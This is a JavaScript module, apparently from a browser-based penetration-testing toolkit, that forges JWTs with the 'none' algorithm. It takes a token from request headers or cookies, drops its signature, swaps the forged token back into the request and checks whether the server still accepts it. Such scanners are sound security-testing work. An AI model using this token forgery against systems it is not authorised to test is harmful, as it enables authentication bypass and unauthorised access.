/* Author: Denis Podgurskii */
import { ptk_module_active } from "../active.js"
import { ptk_jwtHelper } from "../../background/utils.js"
import CryptoES from '../../packages/crypto-es/index.js'

export class ptk_jwt extends ptk_module_active {
    constructor() {
        super()

        this.severity = "High"
        this.attacks = [
            {
                id: "jwt_1",
                description: "JWT None Algorithm",
                methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
                location: ['Path', 'Query', 'Post', 'Cookie'],
                options: {
                    responseStatus: 200
                }
            }


        ]
        this.jwtHelper = new ptk_jwtHelper()
    }

    prepareAttack(schema, attack, random) {

        let resHeaders = this.checkHeaders(schema)
        let resCookies = this.checkCookies(schema)

        if (resCookies.jwtToken || resHeaders.jwtToken) {
            let jwtToken = resHeaders.jwtToken ? resHeaders.jwtToken : resCookies.jwtToken 
            schema = this.modifyToken(schema, jwtToken)
            return { schema, attack }
        }
        return null
    }

    validateAttack(item, vulnRegex, originalRequest) {
        if (originalRequest) {
            let body = atob(item.body)
            if (originalRequest.body == body) {
                item.success = true
                item.proof = ""
                console.log("none attack success")
            } else {
                item.success = false
                item.proof = ""
                console.log("none attack NO success")
            }
        }
        return item
    }

    modifyToken(schema, jwtToken) {
        let token = jwtToken[1].split('.')
        let jwtHeader = this.decodeJWT(token[0])
        jwtHeader.alg = "none"

        let noneToken = this.base64urlEncode(JSON.stringify(jwtHeader)) + "." + token[1] + "."

        for (let i = 0; i < schema.request.headers.length; i++) {
            schema.request.headers[i].value = schema.request.headers[i].value.replace(jwtToken[1], noneToken)
        }
        return schema
    }

    decodeJWT(t) {
        var base64 = t.replace(/-/g, '+').replace(/_/g, '/');
        var jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
        }).join(''))
        return JSON.parse(jsonPayload)
    }


    base64urlEncode(source) {
        // Encode in classical base64
        let encodedSource = CryptoES.enc.Base64.stringify(CryptoES.enc.Utf8.parse(source))

        // Remove padding equal characters
        encodedSource = encodedSource.replace(/=+$/, '')

        // Replace characters according to base64url specifications
        encodedSource = encodedSource.replace(/\+/g, '-')
        encodedSource = encodedSource.replace(/\//g, '_')

        return encodedSource
    }

    checkHeaders(schema) {
        return this.jwtHelper.checkJWT(schema.request.raw, this.jwtHelper.headersRawRegex)
    }

    checkCookies(schema) {
        return this.jwtHelper.checkJWT(schema.request.raw, this.jwtHelper.cookiesRawRegex)
    }

}